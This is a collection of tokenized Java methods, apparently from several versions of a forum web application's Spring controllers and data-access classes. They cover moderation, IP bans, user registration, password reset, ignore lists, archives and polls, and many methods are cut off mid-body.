public void handleMessage ( SearchQueueSender . UpdateMonth msgUpdate ) throws MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > topicIds = messageDao . getMessageForMonth ( year , month ) ; for ( int topicId : topicIds ) { reindexMessage ( topicId , true ) ; } solrServer . commit ( ) ; long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
public ModelAndView showForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } return new ModelAndView ( " setpostscore " , " message " , messageDao . getById ( msgid ) ) ; } 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( defaultValue = " false " ) boolean sticky , @RequestParam ( defaultValue = " false " ) boolean notop , @RequestParam ( defaultValue = " false " ) boolean minor ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } if ( postscore < Message . POSTSCORE_UNRESTRICTED ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_UNRESTRICTED & & postscore < Message . POSTSCORE_REGISTERED_ONLY ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_MODERATORS_ONLY ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Message message = messageDao . getById ( msgid ) ; Section section = sectionDao . getSection ( message . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Message message = messageDao . getById ( msgid ) ; mv . getModel ( ) . put ( " message " , message ) ; Section section = sectionDao . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , true ) ) ; return mv ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , userDao . getIgnoreList ( tmpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : HTMLFormatter . nl2br ( userinfo ) ) ; return mv ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) throws Exception { Connection db = null ; Section section = sectionDao . getSection ( sectionid ) ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " tag " , required = false ) String tag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " view-news.jsp " ) ; StringBuilder urlParams = new StringBuilder ( ) ; Section section = null ; if ( sectionid ! = null ) { urlParams . append ( " section= " ) . append ( Integer . toString ( sectionid ) ) ; section = sectionDao . getSection ( sectionid ) ; params . put ( " section " , section ) ; params . put ( " archiveLink " , section . getArchiveLink ( ) ) ; } if ( tag ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " tag= " ) . append ( URLEncoder . encode ( tag ) ) ; } if ( groupid ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " group= " ) . append ( Integer . toString ( groupid ) ) ; } params . put ( " params " , urlParams ) ; Connection db = null ; try { if ( month = = null ) { 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId ) throws Exception { ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionDao . getSection ( sectionId ) ; modelAndView . getModel ( ) . put ( " section " , section ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletResponse response ) throws Exception { Section section = sectionDao . getSection ( sectionId ) ; Group group ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; group = section . getGroup ( db , groupName ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) throws Exception { Section section = sectionDao . getSection ( sectionid ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public List < Message > doInConnection ( Connection con ) throws SQLException , DataAccessException { return newsViewer . getMessagesCached ( con ) ; } 
public List < Message > doInConnection ( Connection con ) throws SQLException , DataAccessException { return newsViewer . getMessages ( con ) ; } 
public DeletedTopic mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new DeletedTopic ( rs ) ; } 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletResponse response ) throws Exception { Section section = sectionDao . getSection ( sectionId ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) throws Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null & & month ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . toString ( year ) + '/' + Integer . toString ( month ) ) ; } if ( groupId ! = null ) { Group group = groupDao . getGroup ( groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public List < PreparedMessage > prepareMessages ( List < Message > messages ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , false ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public int getTagId ( String tag ) throws UserErrorException , TagNotFoundException { checkTag ( tag ) ; List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " , Integer . class , tag ) ; if ( res . isEmpty ( ) ) { throw new TagNotFoundException ( ) ; 
public PreparedMessage prepareMessage ( Message message , boolean includeCut ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut , false ) ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut , boolean useAbsoluteUrl ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut , useAbsoluteUrl ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > tags ) { return prepareMessage ( message , tags , true , false ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > tags , boolean includeCut , boolean useAbsoluteUrl ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PreparedMessage > prepareMessages ( List < Message > messages , boolean useAbsoluteUrl ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , false , useAbsoluteUrl ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public List < Message > doInConnection ( Connection con ) throws SQLException , DataAccessException { return feedBurner ? nv . getMessages ( con ) : nv . getMessagesCached ( con ) ; } 
public List < PreparedMessage > getPreparedMessages ( Connection db ) throws SQLException { List < Message > messages = getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = new PreparedMessage ( db , message , false , mainUrl ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public List < Message > doInConnection ( Connection con ) throws SQLException , DataAccessException { return nv . getMessages ( con ) ; } 
public static EditInfoDTO createFromMessage ( TagDao tagDao , Message message ) { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . toString ( tagDao . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public ModelAndView showEditInfo ( @PathVariable ( " id " ) int msgid ) throws Exception { Message message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . build ( message ) ; ModelAndView mv = new ModelAndView ( " history " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public List < EditInfoDTO > loadEditInfo ( int msgid ) { List < EditInfoDTO > list = jdbcTemplate . query ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " , BeanPropertyRowMapper . newInstance ( EditInfoDTO . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public void resolveMessage ( int msgid , boolean b ) { jdbcTemplate . update ( " UPDATE topics SET resolved=?,lastmod=lastmod+'1 second'::interval WHERE id=? " , 
public void addToMemories ( int userid , int topic ) { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM memories WHERE userid=? AND topic=? FOR UPDATE " , Integer . class , userid , topic ) ; if ( res . isEmpty ( ) ) { jdbcTemplate . update ( 
public MemoriesListItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new MemoriesListItem ( rs ) ; } 
public void delete ( int id ) { jdbcTemplate . update ( " DELETE FROM memories WHERE id=? " , id ) ; } 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( defaultValue = " false " ) boolean sticky , @RequestParam ( defaultValue = " false " ) boolean notop , @RequestParam ( defaultValue = " false " ) boolean minor ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } if ( postscore < Message . POSTSCORE_UNRESTRICTED ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_UNRESTRICTED & & postscore < Message . POSTSCORE_REGISTERED_ONLY ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_MODERATORS_ONLY ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; Message msg = messageDao . getById ( msgid ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView undelete ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showList ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; return new ModelAndView ( " ignore-list " , " ignoreList " , ignoreMap ) ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) throws UserNotFoundException { Map < Integer , User > ignoreMap = new HashMap < Integer , User > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } return ignoreMap ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userDao . getUser ( id ) ; ignoreListDao . remove ( user , delUser ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; return new ModelAndView ( " ignore-list " , " ignoreList " , ignoreMap ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : HTMLFormatter . nl2br ( userinfo ) ) ; return mv ; } 
public void remove ( User listOwner , User userToIgnore ) { jdbcTemplate . update ( " DELETE FROM ignore_list WHERE userid=? AND ignored=? " , 
public Set < Integer > get ( User user ) { final ImmutableSet . Builder < Integer > builder = ImmutableSet . builder ( ) ; jdbcTemplate . query ( queryIgnoreList , new RowCallbackHandler ( ) { @Override public void processRow ( ResultSet resultSet ) throws SQLException { builder . add ( resultSet . getInt ( " ignored " ) ) ; } } , user . getId ( ) ) ; return builder . build ( ) ; } 
public ModelAndView serverInfo ( ) throws Exception { List < User > moderators = userDao . getModerators ( ) ; ModelAndView mv = new ModelAndView ( " server " ) ; mv . getModel ( ) . put ( " moderators " , moderators ) ; List < User > correctors = userDao . getCorrectors ( ) ; mv . getModel ( ) . put ( " correctors " , correctors ) ; return mv ; } 
public void uncommit ( Message msg ) { jdbcTemplate . update ( " UPDATE topics SET moderate='f',commitby=NULL,commitdate=NULL WHERE id=? " , msg . getId ( ) ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) throws Exception { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionDao . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveDTO > items = archiveDao . getArchiveDTO ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public ModelAndView showForm ( @RequestParam ( " group " ) int id , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Group group = groupDao . getGroup ( id ) ; ModelAndView mv = new ModelAndView ( " groupmod " , " group " , group ) ; mv . getModel ( ) . put ( " groupInfo " , prepareService . prepareGroupInfo ( group ) ) ; return mv ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) throws Exception { Section section = sectionDao . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " section " , params ) ; } 
public void setSectionDa ( SectionDao sectionDao ) throws SectionNotFoundException { sectionNews = sectionDao . getSection ( Section . SECTION_NEWS ) ; } 
public List < ArchiveDao . ArchiveDTO > get ( ) { return archiveDao . getArchiveDTO ( sectionNews , 13 ) ; } 
public ArchiveDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { ArchiveDTO dto = new ArchiveDTO ( ) ; dto . setYear ( rs . getInt ( " year " ) ) ; dto . setMonth ( rs . getInt ( " month " ) ) ; dto . setCount ( rs . getInt ( " c " ) ) ; dto . setSection ( section ) ; dto . setGroup ( group ) ; return dto ; } 
public Group getGroup ( int id ) throws BadGroupException { try { return jdbcTemplate . queryForObject ( 
public Group mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new Group ( rs ) ; } 
public int calcTopicsCount ( Group group , boolean showDeleted ) { String query = " SELECT count(topics.id) " + " FROM topics WHERE " + ( group . isModerated ( ) ? " moderate AND " : " " ) + " groupid=? " ; if ( ! showDeleted ) { query + = " AND NOT topics.deleted " ; } List < Integer > res = jdbcTemplate . queryForList ( query , Integer . class , group . getId ( ) ) ; if ( ! res . isEmpty ( ) ) { return res . get ( 0 ) ; 
public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setString ( 1 , title ) ; if ( info . length ( ) > 0 ) { pst . setString ( 2 , info ) ; } else { pst . setString ( 2 , null ) ; } if ( longInfo . length ( ) > 0 ) { pst . setString ( 3 , longInfo ) ; } else { pst . setString ( 3 , null ) ; } pst . setBoolean ( 4 , resolvable ) ; pst . setString ( 5 , urlName ) ; pst . setInt ( 6 , group . getId ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
private void updateCache ( Connection db ) { try { getUser ( db , id , false ) ; 
public String resetPassword ( User user ) { String password = StringUtil . generatePassword ( ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String encryptedPassword = encryptor . encryptPassword ( password ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , encryptedPassword , user . getId ( ) ) ; return password ; } 
public void updateResetDate ( User user , Timestamp now ) { jdbcTemplate . update ( " UPDATE users SET lostpwd=? WHERE id=? " , now , user . getId ( ) ) ; } 
public boolean canResetPassword ( User user ) { return ! jdbcTemplate . queryForObject ( " SELECT lostpwd>CURRENT_TIMESTAMP-'1 week'::interval as datecheck FROM users WHERE id=? " , 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , ts ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip ) ) ) ; } 
public void blockIP ( String ip , User moderator , String reason , Timestamp ts ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( blockInfo = = null ) { jdbcTemplate . update ( 
public Comment getById ( int id ) throws MessageNotFoundException { Comment comment ; try { comment = jdbcTemplate . queryForObject ( queryCommentById , new RowMapper < Comment > ( ) { @Override public Comment mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Comment ( resultSet , deleteInfoDao ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return comment ; } 
public String mapRow ( ResultSet resultSet , int i ) throws SQLException { String text = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return ParserUtil . bb2xhtml ( text , true , true , " " , userDao ) ; 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return deleteReplys ( msgid , user , score , 0 ) ; } 
public CommentsListItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { CommentsListItem item = new CommentsListItem ( ) ; item . setSectionTitle ( rs . getString ( " ptitle " ) ) ; item . setGroupTitle ( rs . getString ( " gtitle " ) ) ; item . setTopicId ( rs . getInt ( " topicid " ) ) ; item . setCommentId ( rs . getInt ( " msgid " ) ) ; item . setTitle ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) ; item . setPostdate ( rs . getTimestamp ( " postdate " ) ) ; return item ; } 
public DeletedListItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new DeletedListItem ( rs ) ; } 
public Object doInConnection ( Connection con ) throws SQLException { tmpl . performLogin ( response , con , user ) ; return null ; } 
public void activateUser ( User user ) { jdbcTemplate . update ( " UPDATE users SET activated='t' WHERE id=? " , user . getId ( ) ) ; } 
public ModelAndView register ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { User user = tmpl . getCurrentUser ( ) ; 
public ModelAndView doRegister ( HttpServletRequest request , @RequestParam String email , @RequestParam ( required = false ) String town , @RequestParam ( required = false ) String info , @RequestParam ( required = false ) String name , @RequestParam ( required = false ) String url , @RequestParam ( required = false ) String password , @RequestParam ( required = false ) String password2 ) throws Exception { HttpSession session = request . getSession ( ) ; Template tmpl = Template . getTemplate ( request ) ; try { boolean changeMode = " change " . equals ( request . getParameter ( " mode " ) ) ; 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . trim ( ) . isEmpty ( ) ) { return ; } setUserInfo ( user . getId ( ) , null ) ; changeScore ( user . getId ( ) , - 10 ) ; } 
public String resetPassword ( User user ) { String password = StringUtil . generatePassword ( ) ; return setPassword ( user , password ) ; } 
public void updateUser ( User user , String name , String url , String new_email , String town , String password , String info ) { jdbcTemplate . update ( " UPDATE users SET name=?, url=?, new_email=?, town=? WHERE id=? " , name , url , new_email , town , user . getId ( ) ) ; if ( password ! = null ) { setPassword ( user , password ) ; } setUserInfo ( user . getId ( ) , info ) ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String town , String info ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForInt ( " select nextval('s_uid') as userid " ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , town ) ; if ( info ! = null ) { setUserInfo ( userid , info ) ; } return userid ; } 
public boolean isUserExists ( String nick ) { int c = jdbcTemplate . queryForInt ( " SELECT count(*) as c FROM users WHERE nick=? " , nick ) ; return c > 0 ; } 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized! " ) ; } User user = tmpl . getCurrentUser ( ) ; String newEmail = userDao . getNewEmail ( user ) ; if ( newEmail = = null ) { throw new AccessViolationException ( " new_email == null?! " ) ; } String regcode = user . getActivationCode ( tmpl . getSecret ( ) , newEmail ) ; if ( ! regcode . equals ( activation ) ) { throw new AccessViolationException ( " Bad activation code " ) ; } userDao . acceptNewEmail ( user ) ; return new ModelAndView ( new RedirectView ( " /people/ " + user . getNick ( ) + " /profile " ) ) ; } 
public void acceptNewEmail ( User user ) { jdbcTemplate . update ( " UPDATE users SET email=new_email WHERE id=? " , user . getId ( ) ) ; } 
private void initCurrentUser ( Connection db , boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } try { currentUser = UserDao . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; 
public static User getUser ( Connection db , String nick ) throws UserNotFoundException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return getUserInternal ( jdbcTemplate , nick ) ; } 
public List < PreparedMessage > prepareMessages ( List < Message > messages , boolean useAbsoluteUrl ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , false , useAbsoluteUrl ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public Poll getPollByTopicId ( int topicId ) throws PollNotFoundException { try { return getPoll ( jdbcTemplate . queryForInt ( queryPoolIdByTopicId , topicId ) ) ; 
public static SortedMap < Integer , String > toMap ( List < PollVariant > list ) { SortedMap < Integer , String > map = new TreeMap < Integer , String > ( ) ; for ( PollVariant v : list ) { map . put ( v . getId ( ) , v . getLabel ( ) ) ; } return map ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut , false , null ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > tags , PreparedPoll newPoll ) { return prepareMessage ( message , tags , true , false , newPoll ) ; } 
private PreparedMessage prepareMessage ( Message message , List < String > tags , boolean includeCut , boolean useAbsoluteUrl , PreparedPoll poll ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PreparedMessage > prepareMessages ( List < Message > messages , boolean useAbsoluteUrl ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , false , useAbsoluteUrl , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public Object doInConnection ( Connection db ) throws SQLException , DataAccessException { if ( Strings . isNullOrEmpty ( label ) ) { var . remove ( db ) ; } else { var . updateLabel ( db , label ) ; } return null ; } 
public Object doInConnection ( Connection db ) throws SQLException , DataAccessException { poll . addNewVariant ( db , var . getLabel ( ) ) ; return null ; } 
public boolean isMultiselect ( ) { return multiselect ; } 
public void createPoll ( List < String > pollList , boolean multiSelect , int msgid ) { final int voteid = getNextPollId ( ) ; jdbcTemplate . update ( " INSERT INTO votenames (id, multiselect, topic) values (?,?,?) " , voteid , multiSelect , msgid ) ; try { final Poll poll = getPoll ( voteid ) ; 
public void addNewVariant ( Poll poll , String label ) { jdbcTemplate . update ( " INSERT INTO votes (id, vote, label) values (nextval('votes_id'), ?, ?) " , 
